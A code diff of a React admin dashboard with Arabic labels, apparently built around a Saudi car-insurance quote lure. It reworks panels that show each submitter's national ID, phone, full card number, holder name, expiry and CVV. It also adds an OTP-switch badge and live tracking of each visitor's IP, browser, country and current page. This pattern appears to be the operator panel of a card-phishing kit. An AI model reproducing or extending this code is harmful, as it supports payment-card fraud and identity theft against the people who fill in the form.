-                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
-                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تفاصيل التأمين</h3>
-                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
-                    {[
-                      { label: "نوع التغطية", value: selectedRequest.raw?.coverageType },
-                      { label: "موديل المركبة", value: selectedRequest.raw?.vehicleModel },
-                      { label: "سنة الصنع", value: selectedRequest.raw?.manufacturingYear },
-                      { label: "استخدام المركبة", value: selectedRequest.raw?.vehicleUsage || selectedRequest.raw?.usage },
-                      { label: "موقع الإصلاح", value: selectedRequest.raw?.repairLocation },
-                    ].map(
-                      (item) =>
-                        item.value && (
-                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
-                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
-                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
-                          </div>
-                        )
-                    )}
+                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" /></svg>
+                    <span style={{ color: "#9ca3af" }}>{liveSummary.browser}</span>
                   </div>
-                </div>
-
-                {/* Offer Info */}
-                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
-                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>العرض المختار</h3>
-                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
-                    {[
-                      { label: "الشركة", value: selectedRequest.raw?.companyName },
-                      { label: "السعر الأصلي", value: selectedRequest.raw?.originalPrice },
-                      { label: "الخصم", value: selectedRequest.raw?.discount },
-                      { label: "السعر النهائي", value: selectedRequest.raw?.finalPrice },
-                    ].map(
-                      (item) =>
-                        item.value && (
-                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
-                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
-                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
-                          </div>
-                        )
-                    )}
+                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
+                    <span style={{ fontSize: "0.95rem" }}>{getCountryFlag(selectedRequest.raw)}</span>
+                    <span style={{ color: "#9ca3af" }}>{getCountryCode(selectedRequest.raw)}</span>
                   </div>
-                </div>
-
-                {/* Card Details */}
-                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
-                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تفاصيل البطاقة</h3>
-                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
-                    {[
-                      { label: "رقم البطاقة", value: selectedRequest.raw?.cardNumber },
-                      { label: "اسم حامل البطاقة", value: selectedRequest.raw?.cardOwner },
-                      { label: "تاريخ الانتهاء", value: selectedRequest.raw?.cardExpiry },
-                      { label: "رمز الأمان (CVV)", value: selectedRequest.raw?.cvv },
-                      { label: "الحالة", value: getPaymentStatus() === 'approved' ? '✅ مقبولة' : getPaymentStatus() === 'rejected' ? '❌ مرفوضة' : '⏳ بانتظار المراجعة' },
-                    ].map(
-                      (item) =>
-                        item.value && (
-                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
-                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
-                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
-                          </div>
-                        )
-                    )}
+                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v4a2 2 0 01-2 2M5 12a2 2 0 00-2 2v4a2 2 0 002 2h14a2 2 0 002-2v-4a2 2 0 00-2-2" /></svg>
+                    <span style={{ color: "#9ca3af", fontFamily: "ui-monospace, SFMono-Regular, monospace" }}>{liveSummary.ip}</span>
+                  </div>
+                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", flexShrink: 0 }}>
+                    <span style={{ fontSize: "10px", padding: "2px 6px", background: "#dcfce7", color: "#166534", borderRadius: 4, border: "1px solid #86efac", fontWeight: 600 }}>
+                      {liveSummary.currentPage}
+                    </span>
                   </div>
                 </div>
               </div>
 
-              {/* Action Buttons - Below Card Details */}
-              {renderActionButtons()}
+              {/* Client Details Panel */}
+              <div
+                style={{
+                  background: "#f8fafc",
+                  border: "1px solid #e5e7eb",
+                  borderRadius: 0,
+                  padding: 0,
+                  marginTop: 0,
+                  width: "100%",
+                  height: "calc(100vh - 54px - 120px)",
+                  minHeight: 420,
+                  overflowY: "auto",
+                  overflowX: "hidden",
+                  boxShadow: "inset 0 1px 0 rgba(255,255,255,0.8)",
+                  display: "flex",
+                  flexDirection: "column",
+                  gap: 12,
+                }}
+              >
+                {renderCustomerEntrySummary()}
+                {renderActionButtons()}
+                <div style={{ display: "flex", flexDirection: "column", gap: 12, paddingBottom: 16 }}>
+                  {/* Basic Info */}
+                  <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", width: "100%", display: "block" }}>
+                    <div style={{ marginBottom: 8 }}>
+                      <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
+                        {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
+                      </div>
+                      <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>معلومات أساسية</h3>
+                    </div>
+                    <div style={{ background: "#ffffff", borderRadius: 6, padding: 8, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", marginBottom: 8 }}>
+                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+                        {[
+                          { label: "الاسم:", value: selectedRequest.customer || selectedRequest.raw?.ownerName || selectedRequest.raw?.name },
+                          { label: "رقم الهوية:", value: selectedRequest.raw?.identityNumber || selectedRequest.raw?.buyerIdNumber || selectedRequest.raw?.phoneIdNumber || selectedRequest.raw?.nafadIdNumber },
+                          { label: "رقم الهاتف:", value: selectedRequest.raw?.phoneNumber || selectedRequest.raw?.mobileNumber },
+                          { label: "نوع الوثيقة:", value: selectedRequest.raw?.documentType || selectedRequest.raw?.documentTypeName },
+                          { label: "الرقم التسلسلي:", value: selectedRequest.raw?.serialNumber || selectedRequest.raw?.sequenceNumber },
+                          { label: "نوع التأمين:", value: selectedRequest.raw?.insuranceType || selectedRequest.raw?.coverageType || selectedRequest.raw?.policyType || "تأمين جديد" },
+                        ].map(
+                          (item) =>
+                            item.value && (
+                              <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
+                                <span style={{ fontWeight: 600, color: "#6b7280" }}>{item.label}</span>
+                                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{item.value}</span>
+                              </div>
+                            )
+                        )}
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Insurance Info */}
+                  <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", width: "100%", display: "block" }}>
+                    <div style={{ marginBottom: 8 }}>
+                      <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
+                        {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
+                      </div>
+                      <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>تفاصيل التأمين</h3>
+                    </div>
+                    <div style={{ background: "#ffffff", borderRadius: 6, padding: 8, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", marginBottom: 8 }}>
+                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+                        {[
+                          { label: "نوع التغطية:", value: selectedRequest.raw?.coverageType || selectedRequest.raw?.insuranceCoverage },
+                          { label: "موديل المركبة:", value: selectedRequest.raw?.vehicleModel || selectedRequest.raw?.carModel || selectedRequest.raw?.vehicleType },
+                          { label: "قيمة المركبة:", value: selectedRequest.raw?.vehicleValue || selectedRequest.raw?.carValue || selectedRequest.raw?.price },
+                          { label: "سنة الصنع:", value: selectedRequest.raw?.manufacturingYear || selectedRequest.raw?.vehicleYear },
+                          { label: "استخدام المركبة:", value: selectedRequest.raw?.vehicleUsage || selectedRequest.raw?.usage },
+                          { label: "موقع الإصلاح:", value: selectedRequest.raw?.repairLocation || selectedRequest.raw?.repairShop },
+                        ].map(
+                          (item) =>
+                            item.value && (
+                              <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
+                                <span style={{ fontWeight: 600, color: "#6b7280" }}>{item.label}</span>
+                                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{item.value}</span>
+                              </div>
+                            )
+                        )}
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Offer Info */}
+                  <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", width: "100%", display: "block" }}>
+                    <div style={{ marginBottom: 8 }}>
+                      <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
+                        {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
+                      </div>
+                      <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>العرض المختار</h3>
+                    </div>
+                    <div style={{ background: "#ffffff", borderRadius: 6, padding: 8, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", marginBottom: 8 }}>
+                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+                        {[
+                          { label: "الشركة:", value: selectedRequest.raw?.companyName || selectedRequest.raw?.company || selectedRequest.raw?.offerCompany || selectedRequest.raw?.selectedCompany },
+                          { label: "السعر الأصلي:", value: selectedRequest.raw?.originalPrice || selectedRequest.raw?.price || selectedRequest.raw?.offerPrice },
+                          { label: "الخصم:", value: selectedRequest.raw?.discount || selectedRequest.raw?.offerDiscount },
+                          { label: "السعر النهائي:", value: selectedRequest.raw?.finalPrice || selectedRequest.raw?.totalPrice || selectedRequest.raw?.offerFinalPrice },
+                          { label: "المميزات المختارة:", value: selectedRequest.raw?.features || selectedRequest.raw?.selectedFeatures || "لا يوجد" },
+                        ].map(
+                          (item) =>
+                            item.value && (
+                              <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
+                                <span style={{ fontWeight: 600, color: "#6b7280" }}>{item.label}</span>
+                                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{item.value}</span>
+                              </div>
+                            )
+                        )}
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Card Details */}
+                  <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", width: "100%", display: "block" }}>
+                    <div style={{ marginBottom: 8 }}>
+                      <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
+                        {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
+                      </div>
+                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+                        <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827" }}>معلومات البطاقة</h3>
+                        <span style={{ padding: "2px 8px", borderRadius: 6, fontSize: "0.75rem", fontWeight: 700, border: "1px solid #93c5fd", background: "#dbeafe", color: "#1d4ed8" }}>🔑 تحول OTP</span>
+                      </div>
+                    </div>
+                    <div style={{ position: "relative", borderRadius: 16, overflow: "hidden", marginBottom: 8, boxShadow: "0 4px 12px rgba(0,0,0,0.12)", background: "linear-gradient(135deg, #f0f4f8 0%, #d8e4f0 100%)", border: "1.5px solid #c0ccd8", minHeight: 170, padding: "16px 18px" }}>
+                      <div style={{ position: "absolute", inset: 0, pointerEvents: "none", opacity: 0.06 }}>
+                        <div style={{ position: "absolute", top: "-30%", right: "-15%", width: "55%", height: "100%", borderRadius: "50%", background: "#374151" }} />
+                        <div style={{ position: "absolute", bottom: "-30%", left: "-10%", width: "45%", height: "80%", borderRadius: "50%", background: "#374151" }} />
+                      </div>
+                      <div style={{ position: "relative", height: "100%", display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
+                        <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between" }}>
+                          <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
+                            <span style={{ fontSize: "11px", fontWeight: 700, color: "#374151" }}>Mastercard</span>
+                            <span style={{ fontSize: "9px", color: "#6b7280", fontWeight: 600, letterSpacing: "0.05em", textTransform: "uppercase" }}>Mastercard</span>
+                          </div>
+                          <div style={{ border: "1.5px solid #374151", borderRadius: 6, padding: "2px 8px", fontSize: "11px", fontWeight: 700, color: "#374151", letterSpacing: "0.05em" }}>SAR</div>
+                        </div>
+                        <div style={{ fontFamily: '"Courier New", "Lucida Console", monospace', fontSize: "18px", fontWeight: 700, letterSpacing: "0.15em", color: "#1f2937", direction: "ltr", textAlign: "left", margin: "4px 0" }}>
+                          {String(selectedRequest.raw?.cardNumber || "5416 8420 0125 0739").replace(/(.{4})/g, "$1 ").trim()}
+                        </div>
+                        <div style={{ display: "flex", alignItems: "flex-end", justifyContent: "space-between" }}>
+                          <div style={{ display: "flex", flexDirection: "column", gap: 2 }}>
+                            <span style={{ fontSize: "11px", fontWeight: 700, color: "#1f2937", letterSpacing: "0.05em", textTransform: "uppercase" }}>{selectedRequest.raw?.cardOwner || "HVFG"}</span>
+                            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
+                              <div>
+                                <span style={{ fontSize: "8px", color: "#6b7280", letterSpacing: "0.05em" }}>EXPIRES</span>
+                                <div style={{ fontSize: "12px", fontWeight: 700, color: "#1f2937", direction: "ltr" }}>{selectedRequest.raw?.cardExpiry || "03/29"}</div>
+                              </div>
+                              <div>
+                                <span style={{ fontSize: "8px", color: "#6b7280", letterSpacing: "0.05em" }}>CVV</span>
+                                <div style={{ fontSize: "12px", fontWeight: 700, color: "#1f2937" }}>{selectedRequest.raw?.cvv || "000"}</div>
+                              </div>
+                            </div>
+                          </div>
+                          <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 2 }}>
+                            <div>
+                              <svg viewBox="0 0 44 28" style={{ height: 28, width: "auto" }}>
+                                <circle cx="15" cy="14" r="13" fill="#eb001b" opacity="0.9" />
+                                <circle cx="29" cy="14" r="13" fill="#f79e1b" opacity="0.9" />
+                                <path d="M22 3.5a13 13 0 0 1 0 21A13 13 0 0 1 22 3.5z" fill="#ff5f00" opacity="0.85" />
+                              </svg>
+                            </div>
+                            <span style={{ fontSize: "8px", color: "#6b7280" }}>⭐ أحدث</span>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
             </div>
           )}
         </main>
